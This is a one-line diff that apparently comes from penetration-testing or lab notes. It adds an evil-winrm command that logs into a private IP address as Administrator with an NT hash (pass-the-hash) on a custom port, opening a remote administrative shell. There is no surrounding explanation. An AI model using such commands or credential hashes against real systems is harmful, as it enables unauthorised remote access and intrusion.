@@ -1,0 +1,1 @@
+evil-winrm -i 192.168.235.141 -u Administrator -H 59b280ba707d22e3ef0aa587fc29ffe5 -P 59856
